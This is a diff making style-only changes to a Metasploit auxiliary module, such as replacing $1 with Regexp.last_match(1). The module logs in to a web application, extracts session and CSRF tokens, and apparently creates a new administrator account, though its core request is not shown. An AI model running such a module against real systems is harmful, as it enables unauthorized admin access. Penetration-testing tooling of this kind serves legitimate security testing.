@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
 
   def initialize
@@ -42,7 +42,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('NEWUSERNAME', [true, 'The username of the new admin account']),
         OptString.new('NEWPASSWORD', [true, 'The password of the new admin account']),
         OptString.new('NEWEMAIL', [true, 'The email of the new admin account']),
-        OptString.new('TARGETURI', [ true, 'The path to the application', '/']),
+        OptString.new('TARGETURI', [ true, 'The path to the application', '/'])
       ], self.class
     )
   end
@@ -67,7 +67,7 @@ class MetasploitModule < Msf::Auxiliary
       print_error('Authentication failed')
       return
     else
-      session = $1 if res.get_cookies =~ /_session_id=([0-9a-f]*)/
+      session = Regexp.last_match(1) if res.get_cookies =~ /_session_id=([0-9a-f]*)/
 
       if session.nil?
         print_error('Failed to retrieve the current session id')
@@ -91,12 +91,12 @@ class MetasploitModule < Msf::Auxiliary
       print_error('Failed to retrieve the CSRF token')
       return
     else
-      csrf_param = $1 if res.body =~ /<meta[ ]+content="(.*)"[ ]+name="csrf-param"[ ]*\/?>/i
-      csrf_token = $1 if res.body =~ /<meta[ ]+content="(.*)"[ ]+name="csrf-token"[ ]*\/?>/i
+      csrf_param = Regexp.last_match(1) if res.body =~ /<meta[ ]+content="(.*)"[ ]+name="csrf-param"[ ]*\/?>/i
+      csrf_token = Regexp.last_match(1) if res.body =~ /<meta[ ]+content="(.*)"[ ]+name="csrf-token"[ ]*\/?>/i
 
       if csrf_param.nil? || csrf_token.nil?
-        csrf_param = $1 if res.body =~ /<meta[ ]+name="csrf-param"[ ]+content="(.*)"[ ]*\/?>/i
-        csrf_token = $1 if res.body =~ /<meta[ ]+name="csrf-token"[ ]+content="(.*)"[ ]*\/?>/i
+        csrf_param = Regexp.last_match(1) if res.body =~ /<meta[ ]+name="csrf-param"[ ]+content="(.*)"[ ]*\/?>/i
+        csrf_token = Regexp.last_match(1) if res.body =~ /<meta[ ]+name="csrf-token"[ ]+content="(.*)"[ ]*\/?>/i
       end
 
       if csrf_param.nil? || csrf_token.nil?
